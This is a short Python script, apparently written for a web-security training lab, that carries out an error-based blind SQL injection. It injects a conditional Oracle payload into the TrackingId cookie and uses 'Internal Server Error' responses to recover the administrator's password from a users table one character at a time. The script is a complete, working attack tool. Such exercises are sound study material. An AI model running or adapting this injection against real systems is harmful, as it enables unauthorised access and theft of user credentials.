import sys
import requests
import string 
import time

if len(sys.argv) != 2:
    print(f"USAGE: {sys.argv[0]} <URL of the lab>")
    sys.exit(1)

URL = sys.argv[1]

dic = string.ascii_letters+string.digits
response = requests.get(URL)
tracking_id = response.cookies["TrackingId"]
sess_cookie = response.cookies["session"]

def password(url):
    
    pwd = ""
    i = 1
    while(True):
        found_char = False
        print(f"Index : {i}")
        for d in dic:
            payload = tracking_id + "' AND (SELECT CASE WHEN (SUBSTR((SELECT password FROM users WHERE username='administrator'), "+str(i)+",1) = '"+d+"') THEN to_char(1/0) ELSE 'a' END FROM Dual)='a"
            response = requests.get(URL, headers={"Cookie":"TrackingId="+payload+"; session="+sess_cookie})
            if "Internal Server Error" in response.text:
                pwd += d
                print(pwd)
                found_char = True
                break
            time.sleep(1)
        i+=1
    
        if not found_char:
            print("Password : ",pwd)
            break

password(URL)
